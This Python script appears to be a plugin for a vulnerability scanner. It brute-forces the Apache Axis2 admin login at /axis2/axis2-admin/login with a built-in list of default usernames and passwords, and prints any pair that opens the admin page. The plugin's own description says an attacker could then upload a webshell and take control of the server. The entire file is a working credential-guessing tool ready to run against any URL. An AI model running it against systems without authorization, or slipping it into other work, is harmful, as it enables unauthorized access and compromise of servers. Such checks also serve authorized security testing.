#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "Axis 弱口令",
        "desc": "攻击者通过此漏洞可直接上传webshell，进而入侵控制服务器。",
        "grade": "高",
        "type": "web",
        "keyword": "tag:axis",
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    user_list = ['axis', 'admin', 'root']
    passwd_list = ['axis2','admin','s3cret','password','p@ssw0rd','1qaz2wsx', 'root']

    error_i = 0
    flag_list = ['Administration Page</title>', 'System Components', '"axis2-admin/upload"',
                 'include page="footer.inc">', 'axis2-admin/logout']
    try:
        for user in user_list:
            for passwd in passwd_list:
                try:
                    login_url = f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/axis2/axis2-admin/login'
                    PostStr = 'userName=%s&password=%s&submit=+Login+' % (user, passwd)
                    r = requests.post(
                        url=login_url,
                        data=PostStr,
                        headers=headers,
                        timeout=timeout,
                        verify=False)
                except requests.HTTPError:
                    return
                except:
                    error_i += 1
                    if error_i >= 3:
                        return
                    continue
                for flag in flag_list:
                    if flag in r.text:
                        return f'{arg}\t{user}/{passwd}'
    except Exception:
        return 


if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  
